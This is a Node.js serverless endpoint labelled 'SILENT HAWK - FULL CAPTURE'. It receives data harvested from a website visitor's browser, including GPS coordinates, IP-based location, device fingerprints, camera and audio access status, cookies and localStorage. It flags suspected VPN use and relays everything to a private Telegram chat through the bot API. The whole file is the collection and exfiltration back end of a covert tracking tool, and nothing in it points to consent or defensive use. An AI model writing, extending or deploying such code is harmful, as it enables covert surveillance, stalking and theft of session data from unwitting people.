const axios = require('axios')

module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    res.setHeader('Access-Control-Allow-Headers', '*')
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end()
    }

    try {
        console.log('📩 Request received for /api/capture', req.method)
        
        let data = {}
        if (req.method === 'POST') {
            data = req.body || {}
            console.log('POST body:', JSON.stringify(data, null, 2))
        } else if (req.method === 'GET' && req.query.data) {
            data = JSON.parse(decodeURIComponent(req.query.data))
            console.log('GET data:', JSON.stringify(data, null, 2))
        } else {
            return res.status(400).json({ error: 'Método não suportado ou dados faltando' })
        }

        // Build Telegram message with all data
        let message = `🚨 *SILENT HAWK - FULL CAPTURE* 🚨\n\n`
        message += `📱 *User Agent:* ${data.userAgent || 'N/A'}\n`
        message += `💻 *Platform:* ${data.platform || 'N/A'}\n`
        message += `🌐 *Language:* ${data.language || 'N/A'}\n`
        message += `⏰ *Timestamp:* ${data.timestamp || new Date().toLocaleString('pt-BR')}\n`
        message += `🖥️ *Resolution:* ${data.screen?.width || 'N/A'}x${data.screen?.height || 'N/A'}\n`
        message += `🏠 *Timezone:* ${data.timezone || 'N/A'}\n`
        message += `🧠 *Device Memory:* ${data.deviceMemory || 'N/A'}\n`
        message += `⚡ *Hardware Concurrency:* ${data.hardwareConcurrency || 'N/A'}\n`

        // Geolocation data
        if (data.geolocation) {
            message += `\n📍 *GPS LOCATION:*\n`
            message += `• Lat: ${data.geolocation.latitude}\n`
            message += `• Long: ${data.geolocation.longitude}\n`
            message += `• Accuracy: ${data.geolocation.accuracy}m\n`
            message += `• Altitude: ${data.geolocation.altitude || 'N/A'}\n`
            message += `• Speed: ${data.geolocation.speed || 'N/A'}\n`
            message += `• 🗺️ [Google Maps](https://maps.google.com/?q=${data.geolocation.latitude},${data.geolocation.longitude})\n`
        } else if (data.geolocationError) {
            message += `\n❌ *Geolocation Error:* ${data.geolocationError}\n`
        }

        // IP triangulation
        if (data.ipLocation) {
            message += `\n🌍 *IP TRIANGULATION:*\n`
            message += `• IP: ${data.ipLocation.ip || data.ipLocation.query || 'N/A'}\n`
            message += `• City: ${data.ipLocation.city || data.ipLocation.regionName || 'N/A'}\n`
            message += `• Region: ${data.ipLocation.region || data.ipLocation.region || 'N/A'}\n`
            message += `• Country: ${data.ipLocation.country_name || data.ipLocation.country || 'N/A'}\n`
            message += `• ISP: ${data.ipLocation.org || data.ipLocation.isp || 'N/A'}\n`
            message += `• ASN: ${data.ipLocation.asn || 'N/A'}\n`
            
            // VPN Detection based on Time Zone comparison
            const ipTimeZone = data.ipLocation.timezone || data.ipLocation.time_zone || null;
            const browserTimeZone = data.timezone;
            if (ipTimeZone && browserTimeZone) {
                if (ipTimeZone !== browserTimeZone) {
                    message += `⚠️ *VPN DETECTED!* Time Zone Mismatch: IP Time Zone: ${ipTimeZone}, Browser Time Zone: ${browserTimeZone}\n`
                } else {
                    message += `✅ *Time Zone Match:* ${browserTimeZone} (No VPN detected)\n`
                }
            }
        } else if (data.ipError) {
            message += `\n❌ *IP Error:* ${data.ipError}\n`
        }

        // Fingerprinting data
        if (data.canvasFingerprint) {
            message += `\n🎨 *Canvas Fingerprint:* Collected\n`
        }
        if (data.webglVendor) {
            message += `• *WebGL Vendor:* ${data.webglVendor}\n`
        }
        if (data.webglRenderer) {
            message += `• *WebGL Renderer:* ${data.webglRenderer}\n`
        }
        if (data.fonts && data.fonts.length > 0) {
            message += `• *Fonts:* ${data.fonts.join(', ')}\n`
        }
        if (data.plugins && data.plugins.length > 0) {
            message += `• *Plugins:* ${data.plugins.join(', ')}\n`
        }

        // Camera and audio access
        if (data.cameraCapture) {
            message += `\n📷 *Camera Access:* GRANTED\n`
        } else if (data.cameraError) {
            message += `\n❌ *Camera Error:* ${data.cameraError}\n`
        }
        if (data.audioCapture) {
            message += `🎤 *Audio Access:* GRANTED\n`
        }

        // Network information
        if (data.connection) {
            message += `\n📡 *Network Info:*\n`
            message += `• Type: ${data.connection.type || 'N/A'}\n`
            message += `• Effective Type: ${data.connection.effectiveType || 'N/A'}\n`
            message += `• Downlink: ${data.connection.downlink || 'N/A'} Mbps\n`
            message += `• RTT: ${data.connection.rtt || 'N/A'} ms\n`
        }

        // Cookies and localStorage
        if (data.cookies) {
            message += `\n🍪 *Cookies:* ${data.cookies.length > 100 ? data.cookies.substring(0, 100) + '...' : data.cookies}\n`
        }
        if (data.localStorage) {
            message += `💾 *Local Storage:* ${data.localStorage.length > 100 ? data.localStorage.substring(0, 100) + '...' : data.localStorage}\n`
        }

        // Send to Telegram
        const token = process.env.TELEGRAM_BOT_TOKEN
        const chatId = process.env.TELEGRAM_CHAT_ID

        if (!token || !chatId) {
            throw new Error('Variáveis de ambiente TELEGRAM_BOT_TOKEN ou TELEGRAM_CHAT_ID não configuradas')
        }

        console.log('Enviando para Telegram...')
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: false
        })

        console.log('Mensagem enviada com sucesso para Telegram')
        res.status(200).json({ success: true, message: 'Dados enviados' })
    } catch (error) {
        console.error('❌ Erro em capture.js:', error.message)
        res.status(500).json({ error: error.message })
    }
}
